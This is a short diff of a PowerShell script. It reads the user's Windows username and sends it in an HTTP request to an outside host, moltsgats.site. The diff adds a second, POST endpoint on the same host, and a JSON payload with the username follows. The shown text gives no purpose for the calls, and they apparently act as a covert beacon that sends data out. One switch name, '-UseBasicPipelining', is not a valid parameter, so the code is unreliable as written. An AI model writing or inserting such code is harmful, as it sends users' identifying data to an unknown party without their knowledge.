@@ -5,6 +5,7 @@ $username = $env:USERNAME
 $getUrl = "https://moltsgats.site/sendsal2025?$username"
 Invoke-RestMethod -Uri $getUrl -Method Get -UseBasicPipelining
 #
+$postUrl = "https://moltsgats.site/sendsal2025"
 $jsonPayload = @{
     username = $username
 } | ConvertTo-Json
